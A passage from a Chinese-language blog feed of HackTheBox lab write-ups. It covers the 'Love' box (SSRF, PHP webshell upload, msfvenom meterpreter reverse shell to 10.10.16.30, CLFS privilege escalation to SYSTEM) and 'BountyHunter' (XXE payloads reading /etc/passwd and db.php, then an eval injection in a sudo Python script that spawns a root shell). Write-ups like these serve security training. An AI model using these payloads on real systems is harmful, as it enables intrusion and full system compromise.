Service Info: Hosts: www.example.com, LOVE, www.love.htb<span class="token punctuation">;</span> OS: Windows<span class="token punctuation">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
<span class="token operator">|</span>_clock-skew: mean: 2h04m17s, deviation: 4h00m02s, median: 4m15s
<span class="token operator">|</span> smb2-time: 
<span class="token operator">|</span>   date: <span class="token number">2025</span>-02-22T03:43:31
<span class="token operator">|</span>_  start_date: N/A
<span class="token operator">|</span> smb-security-mode: 
<span class="token operator">|</span>   account_used: guest
<span class="token operator">|</span>   authentication_level: user
<span class="token operator">|</span>   challenge_response: supported
<span class="token operator">|</span>_  message_signing: disabled <span class="token punctuation">(</span>dangerous, but default<span class="token punctuation">)</span>
<span class="token operator">|</span> smb2-security-mode: 
<span class="token operator">|</span>   <span class="token number">3</span>:1:1: 
<span class="token operator">|</span>_    Message signing enabled but not required
<span class="token operator">|</span> smb-os-discovery: 
<span class="token operator">|</span>   OS: Windows <span class="token number">10</span> Pro <span class="token number">19042</span> <span class="token punctuation">(</span>Windows <span class="token number">10</span> Pro <span class="token number">6.3</span><span class="token punctuation">)</span>
<span class="token operator">|</span>   OS CPE: cpe:/o:microsoft:windows_10::-
<span class="token operator">|</span>   Computer name: Love
<span class="token operator">|</span>   NetBIOS computer name: LOVE<span class="token punctuation">\</span>x00
<span class="token operator">|</span>   Workgroup: WORKGROUP<span class="token punctuation">\</span>x00
<span class="token operator">|</span>_  System time: <span class="token number">2025</span>-02-21T19:43:34-08:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">282.61</span> seconds
</code></pre>

<p>通过扫描在443 端口发现一个子域名，将<code>love.htb</code>和<code>staging.love.htb</code>添加本地域名解析到hosts文件</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">'10.10.10.239 love.htb'</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> <span class="token parameter variable">-a</span> /etc/hosts
<span class="token builtin class-name">echo</span> <span class="token string">'10.10.10.239 staging.love.htb'</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> <span class="token parameter variable">-a</span> /etc/hosts</code></pre>

<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>访问<code>staging.love.htb</code> 点击Demo 找到一个输入框</p>
<img src="/Hackthebox/htb/htb-love/image-20250222122349377.png" class="" title="访问">

<p>使用Python3 启用一个web服务，在输入框中输入url 然后点击<code>Scan file</code> 发现存在SSRF</p>
<img src="/Hackthebox/htb/htb-love/image-20250222123810029.png" class="" title="SSRF">

<p>依次探测开放端口，发现在5000端口可以读取到凭证</p>
<img src="/Hackthebox/htb/htb-love/image-20250222130122775.png" class="" title="内网探测">

<p>对<code>love.htb</code>和<code>staging.love.htb</code> 目录进行fuzz 发现<code>love.htb</code> 有个admin页面，使用获取到的帐号密码登录，点击Votes，上传php木马</p>
<img src="/Hackthebox/htb/htb-love/image-20250222131025885.png" class="" title="文件上传">

<p>使用蚁剑连接shell</p>
<img src="/Hackthebox/htb/htb-love/image-20250222142215068.png" class="" title="Getshell">

<img src="/Hackthebox/htb/htb-love/image-20250222133719719.png" class="" title="upload">

<p>将shell从蚁剑转到msfconsole：生成后门，然后使用蚁剑上传文件并执行</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 生成payload</span>
msfvenom <span class="token parameter variable">-p</span> windows/x64/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">10.10</span>.16.30 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4444</span> <span class="token parameter variable">-f</span> exe <span class="token operator">></span> shell.exe 
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: <span class="token number">510</span> bytes
Final size of exe file: <span class="token number">7168</span> bytes
<span class="token comment"># 接收反弹shell</span>
msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> exploit 
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">10.10</span>.16.30:4444 
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Sending stage <span class="token punctuation">(</span><span class="token number">203846</span> bytes<span class="token punctuation">)</span> to <span class="token number">10.10</span>.10.239
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Meterpreter session <span class="token number">1</span> opened <span class="token punctuation">(</span><span class="token number">10.10</span>.16.30:4444 -<span class="token operator">></span> <span class="token number">10.10</span>.10.239:52670<span class="token punctuation">)</span> at <span class="token number">2025</span>-02-22 <span class="token number">13</span>:43:06 +0800
meterpreter <span class="token operator">></span> getuid 
Server username: LOVE<span class="token punctuation">\</span>Phoebe</code></pre>

<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>使用 <code>multi/recon/local_exploit_suggester</code>  收集信息为提权做准备</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">msf6 post<span class="token punctuation">(</span>multi/recon/local_exploit_suggester<span class="token punctuation">)</span> <span class="token operator">></span> run
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.239 - Collecting <span class="token builtin class-name">local</span> exploits <span class="token keyword">for</span> x64/windows<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.239 - <span class="token number">203</span> exploit checks are being tried<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.239 - exploit/windows/local/always_install_elevated: The target is vulnerable.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.239 - exploit/windows/local/bypassuac_dotnet_profiler: The target appears to be vulnerable.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.239 - exploit/windows/local/bypassuac_fodhelper: The target appears to be vulnerable.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.239 - exploit/windows/local/bypassuac_sdclt: The target appears to be vulnerable.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.239 - exploit/windows/local/cve_2021_40449: The target appears to be vulnerable. Vulnerable Windows <span class="token number">10</span> 20H2 build detected<span class="token operator">!</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.239 - exploit/windows/local/cve_2022_21882_win32k: The target appears to be vulnerable.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.239 - exploit/windows/local/cve_2022_21999_spoolfool_privesc: The target appears to be vulnerable.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.239 - exploit/windows/local/cve_2023_28252_clfs_driver: The target appears to be vulnerable. The target is running windows version: <span class="token number">10.0</span>.19042.0 <span class="token function">which</span> has a vulnerable version of clfs.sys installed by default
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.239 - exploit/windows/local/cve_2024_35250_ks_driver: The target appears to be vulnerable. ks.sys is present, Windows Version detected: Windows <span class="token number">10</span> version 20H2
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.239 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The <span class="token function">service</span> is running, but could not be validated.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Running check method <span class="token keyword">for</span> exploit <span class="token number">48</span> / <span class="token number">48</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.239 - Valid modules <span class="token keyword">for</span> session <span class="token number">1</span>:
</code></pre>

<p>查看系统版本为19042，使用<code>exploit/windows/local/cve_2023_28252_clfs_driver</code> 进行权限提升</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">meterpreter <span class="token operator">></span> sysinfo 
Computer        <span class="token builtin class-name">:</span> LOVE
OS              <span class="token builtin class-name">:</span> Windows <span class="token number">10</span> <span class="token punctuation">(</span><span class="token number">10.0</span> Build <span class="token number">19042</span><span class="token punctuation">)</span>.
Architecture    <span class="token builtin class-name">:</span> x64
System Language <span class="token builtin class-name">:</span> en_US
Domain          <span class="token builtin class-name">:</span> WORKGROUP
Logged On Users <span class="token builtin class-name">:</span> <span class="token number">2</span>
Meterpreter     <span class="token builtin class-name">:</span> x64/windows</code></pre>

<pre class="language-bash" data-language="bash"><code class="language-bash">msf6 exploit<span class="token punctuation">(</span>windows/local/cve_2023_28252_clfs_driver<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> LHOST tun0
LHOST <span class="token operator">=</span><span class="token operator">></span> <span class="token number">10.10</span>.16.30
msf6 exploit<span class="token punctuation">(</span>windows/local/cve_2023_28252_clfs_driver<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> session <span class="token number">1</span>
session <span class="token operator">=</span><span class="token operator">></span> <span class="token number">1</span>
msf6 exploit<span class="token punctuation">(</span>windows/local/cve_2023_28252_clfs_driver<span class="token punctuation">)</span> <span class="token operator">></span> exploit 
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">10.10</span>.16.30:4444 
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Running automatic check <span class="token punctuation">(</span><span class="token string">"set AutoCheck false"</span> to disable<span class="token punctuation">)</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> The target appears to be vulnerable. The target is running windows version: <span class="token number">10.0</span>.19042.0 <span class="token function">which</span> has a vulnerable version of clfs.sys installed by default
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Launching netsh to <span class="token function">host</span> the DLL<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Process <span class="token number">3976</span> launched.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Reflectively injecting the DLL into <span class="token number">3976</span><span class="token punctuation">..</span>.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Exploit finished, <span class="token function">wait</span> <span class="token keyword">for</span> <span class="token punctuation">(</span>hopefully privileged<span class="token punctuation">)</span> payload execution to complete.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Sending stage <span class="token punctuation">(</span><span class="token number">203846</span> bytes<span class="token punctuation">)</span> to <span class="token number">10.10</span>.10.239
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Meterpreter session <span class="token number">2</span> opened <span class="token punctuation">(</span><span class="token number">10.10</span>.16.30:4444 -<span class="token operator">></span> <span class="token number">10.10</span>.10.239:52672<span class="token punctuation">)</span> at <span class="token number">2025</span>-02-22 <span class="token number">13</span>:55:57 +0800

meterpreter <span class="token operator">></span> getuid 
Server username: NT AUTHORITY<span class="token punctuation">\</span>SYSTEM</code></pre>

<table>
<thead>
<tr>
<th align="left">Flag</th>
<th align="left">Path</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Flag1</td>
<td align="left">C:\Users\Phoebe\Desktop\user.txt</td>
</tr>
<tr>
<td align="left">Flag2</td>
<td align="left">C:\Users\Administrator\Desktop\root.txt</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>RCE</tag>
        <tag>SSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-BountyHunter</title>
    <url>/Hackthebox/htb/htb-bountyhunter/</url>
    <content><![CDATA[<style>.kzdtwqxknmpe{zoom:50%;}</style><img src="/Hackthebox/htb/htb-bountyhunter/a24c032885e56a17a6c74cc58b63e8f4.png" class="kzdtwqxknmpe">

<span id="more"></span>

<table>
<thead>
<tr>
<th align="left">OS</th>
<th align="left">Difficulty</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Linux</td>
<td align="left">Easy</td>
</tr>
</tbody></table>
<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ nmap <span class="token number">10.10</span>.11.100 <span class="token parameter variable">-sV</span> <span class="token parameter variable">-sC</span>  -p- <span class="token parameter variable">-T4</span> --min-rate <span class="token number">1000</span> <span class="token parameter variable">-e</span> tun0 
Starting Nmap <span class="token number">7.95</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2025</span>-02-22 09:08 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">10.10</span>.11.100
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.12s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">65533</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT   STATE SERVICE VERSION
<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">8</span>.2p1 Ubuntu 4ubuntu0.2 <span class="token punctuation">(</span>Ubuntu Linux<span class="token punctuation">;</span> protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
<span class="token operator">|</span> ssh-hostkey: 
<span class="token operator">|</span>   <span class="token number">3072</span> d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span>
<span class="token operator">|</span>   <span class="token number">256</span> a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
<span class="token operator">|</span>_  <span class="token number">256</span> a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
<span class="token number">80</span>/tcp <span class="token function">open</span>  http    Apache httpd <span class="token number">2.4</span>.41 <span class="token variable"><span class="token punctuation">((</span>Ubuntu<span class="token punctuation">))</span></span>
<span class="token operator">|</span>_http-title: Bounty Hunters
<span class="token operator">|</span>_http-server-header: Apache/2.4.41 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span>
Service Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">99.59</span> seconds
</code></pre>

<p>开放了2个端口22(SSH)和80(HTTP)，对80进行Fuzz</p>
<h3 id="Fuzzing"><a href="#Fuzzing" class="headerlink" title="Fuzzing"></a>Fuzzing</h3><p>找到&#x2F;index.php、 &#x2F;portal.php、 &#x2F;db.php</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ ffuf <span class="token parameter variable">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ <span class="token parameter variable">-u</span> http://10.10.11.100/FUZZ.php  <span class="token parameter variable">-t</span> <span class="token number">100</span> <span class="token parameter variable">-ic</span>

        /<span class="token string">'___\  /'</span>___<span class="token punctuation">\</span>           /'___<span class="token punctuation">\</span>       
       /<span class="token punctuation">\</span> <span class="token punctuation">\</span>__/ /<span class="token punctuation">\</span> <span class="token punctuation">\</span>__/  __  __  /<span class="token punctuation">\</span> <span class="token punctuation">\</span>__/       
       <span class="token punctuation">\</span> <span class="token punctuation">\</span> ,__<span class="token punctuation">\</span><span class="token punctuation">\</span> <span class="token punctuation">\</span> ,__<span class="token punctuation">\</span>/<span class="token punctuation">\</span> <span class="token punctuation">\</span>/<span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> ,__<span class="token punctuation">\</span>      
        <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_/ <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_/<span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_/      
         <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span>   <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span>  <span class="token punctuation">\</span> <span class="token punctuation">\</span>____/  <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span>       
          <span class="token punctuation">\</span>/_/    <span class="token punctuation">\</span>/_/   <span class="token punctuation">\</span>/___/    <span class="token punctuation">\</span>/_/       

       v2.1.0-dev
________________________________________________

 :: Method           <span class="token builtin class-name">:</span> GET
 :: URL              <span class="token builtin class-name">:</span> http://10.10.11.100/FUZZ.php
 :: Wordlist         <span class="token builtin class-name">:</span> FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects <span class="token builtin class-name">:</span> <span class="token boolean">false</span>
 :: Calibration      <span class="token builtin class-name">:</span> <span class="token boolean">false</span>
 :: Timeout          <span class="token builtin class-name">:</span> <span class="token number">10</span>
 :: Threads          <span class="token builtin class-name">:</span> <span class="token number">100</span>
 :: Matcher          <span class="token builtin class-name">:</span> Response status: <span class="token number">200</span>-299,301,302,307,401,403,405,500
________________________________________________
index                   <span class="token punctuation">[</span>Status: <span class="token number">200</span>, Size: <span class="token number">25169</span>, Words: <span class="token number">10028</span>, Lines: <span class="token number">389</span>, Duration: 3174ms<span class="token punctuation">]</span>
portal                  <span class="token punctuation">[</span>Status: <span class="token number">200</span>, Size: <span class="token number">125</span>, Words: <span class="token number">11</span>, Lines: <span class="token number">6</span>, Duration: 204ms<span class="token punctuation">]</span>
db                      <span class="token punctuation">[</span>Status: <span class="token number">200</span>, Size: <span class="token number">0</span>, Words: <span class="token number">1</span>, Lines: <span class="token number">1</span>, Duration: 105ms<span class="token punctuation">]</span></code></pre>

<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>访问&#x2F;portal.php 跳转到表单页面</p>
<img src="/Hackthebox/htb/htb-bountyhunter/image-20250222104837169.png" class="" title="跳转">

<p>使用burp进行抓包，对数据包进行base64解码，发现是XML</p>
<img src="/Hackthebox/htb/htb-bountyhunter/image-20250222104858450.png" class="" title="表单">

<p>尝试进行XXE攻击，找到两个帐号：development和root</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml  version="1.0" encoding="ISO-8859-1"?></span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">replace</span> <span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY example SYSTEM "file:///etc/passwd"> </span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bugreport</span><span class="token punctuation">></span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&example;">&amp;example;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>cwe</span><span class="token punctuation">></span></span>111<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>cwe</span><span class="token punctuation">></span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>cvss</span><span class="token punctuation">></span></span>3.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>cvss</span><span class="token punctuation">></span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>reward</span><span class="token punctuation">></span></span>20<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>reward</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bugreport</span><span class="token punctuation">></span></span></code></pre>

<img src="/Hackthebox/htb/htb-bountyhunter/image-20250222092505979.png" class="" title="XXE">

<p>使用PHP Wrapper 读取db.php文件</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml  version="1.0" encoding="ISO-8859-1"?></span>
&lt;!DOCTYPE replace [&lt;!ENTITY example SYSTEM php://filter/convert.base64-encode/resource=db.php"> ]>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bugreport</span><span class="token punctuation">></span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&example;">&amp;example;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>cwe</span><span class="token punctuation">></span></span>111<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>cwe</span><span class="token punctuation">></span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>cvss</span><span class="token punctuation">></span></span>3.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>cvss</span><span class="token punctuation">></span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>reward</span><span class="token punctuation">></span></span>20<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>reward</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bugreport</span><span class="token punctuation">></span></span></code></pre>

<img src="/Hackthebox/htb/htb-bountyhunter/image-20250222094939072.png" class="" title="XXE">

<p>解码base64,找到数据库密码，使用development登录SSH</p>
<img src="/Hackthebox/htb/htb-bountyhunter/image-20250222095232981.png" class="" title="解码">

<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>使用<code>sudo -l</code>找个一个可利用的Python文件</p>
<img src="/Hackthebox/htb/htb-bountyhunter/image-20250222101020734.png" class="" title="提权">

<p>分析Python脚本</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#Skytrain Inc Ticket Validation System 0.1</span>
<span class="token comment">#Do not distribute this file.</span>

<span class="token keyword">def</span> <span class="token function">load_file</span><span class="token punctuation">(</span>loc<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> loc<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">".md"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span>loc<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Wrong file type."</span><span class="token punctuation">)</span>
        exit<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">evaluate</span><span class="token punctuation">(</span>ticketFile<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment">#Evaluates a ticket to check for ireggularities.</span>
    code_line <span class="token operator">=</span> <span class="token boolean">None</span>
    <span class="token keyword">for</span> i<span class="token punctuation">,</span>x <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>ticketFile<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> <span class="token keyword">not</span> x<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"# Skytrain Inc"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token operator">//</span> md 文档第<span class="token number">1</span>行需要包含
                <span class="token keyword">return</span> <span class="token boolean">False</span>
            <span class="token keyword">continue</span>
        <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> <span class="token keyword">not</span> x<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"## Ticket to "</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token operator">//</span>md 文档第<span class="token number">2</span>行需要包含，注意有个空格
                <span class="token keyword">return</span> <span class="token boolean">False</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Destination: </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token string">' '</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>x<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
            <span class="token keyword">continue</span>

        <span class="token keyword">if</span> x<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"__Ticket Code:__"</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token operator">//</span>md 文档第<span class="token number">3</span>行需要包含
            code_line <span class="token operator">=</span> i<span class="token operator">+</span><span class="token number">1</span>
            <span class="token keyword">continue</span>

        <span class="token keyword">if</span> code_line <span class="token keyword">and</span> i <span class="token operator">==</span> code_line<span class="token punctuation">:</span>  <span class="token operator">//</span>md 文档第<span class="token number">4</span>行需要包含
            <span class="token keyword">if</span> <span class="token keyword">not</span> x<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"**"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">return</span> <span class="token boolean">False</span>
            ticketCode <span class="token operator">=</span> x<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"**"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"+"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>  <span class="token operator">//</span>匹配<span class="token operator">**</span>开头，并且根据<span class="token operator">+</span>分割，取第一项
            <span class="token keyword">if</span> <span class="token builtin">int</span><span class="token punctuation">(</span>ticketCode<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">7</span> <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">:</span>  <span class="token operator">//</span>取出的值模<span class="token number">7</span> 等于<span class="token number">4</span> 如<span class="token number">4</span><span class="token punctuation">,</span><span class="token number">11</span>，<span class="token number">18</span>
                validationNumber <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"**"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token keyword">if</span> validationNumber <span class="token operator">></span> <span class="token number">100</span><span class="token punctuation">:</span>
                    <span class="token keyword">return</span> <span class="token boolean">True</span>
                <span class="token keyword">else</span><span class="token punctuation">:</span>
                    <span class="token keyword">return</span> <span class="token boolean">False</span>
    <span class="token keyword">return</span> <span class="token boolean">False</span>

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    fileName <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"Please enter the path to the ticket file.\n"</span><span class="token punctuation">)</span>
    ticket <span class="token operator">=</span> load_file<span class="token punctuation">(</span>fileName<span class="token punctuation">)</span>
    <span class="token comment">#DEBUG print(ticket)</span>
    result <span class="token operator">=</span> evaluate<span class="token punctuation">(</span>ticket<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Valid ticket."</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Invalid ticket."</span><span class="token punctuation">)</span>
    ticket<span class="token punctuation">.</span>close

main<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>

<p>分析Python脚本后，创建一个md文件，使用sudo 运行脚本，提权成功</p>
<pre class="language-none"><code class="language-none"># Skytrain Inc
## Ticket to 
__Ticket Code:__
**11+eval(&quot;__import__(&#39;os&#39;).system(&#39;bash&#39;)&quot;)</code></pre>

<img src="/Hackthebox/htb/htb-bountyhunter/image-20250222104056058.png" class="" title="Getshell">

<table>
<thead>
<tr>
<th align="left">Flag</th>
<th align="left">Path</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Flag1</td>
<td align="left">&#x2F;home&#x2F;development&#x2F;user.txt</td>
</tr>
<tr>
<td align="left">Flag2</td>
<td align="left">&#x2F;root&#x2F;root.txt</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>XXE</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-DevOops</title>
    <url>/Hackthebox/htb/htb-devoops/</url>
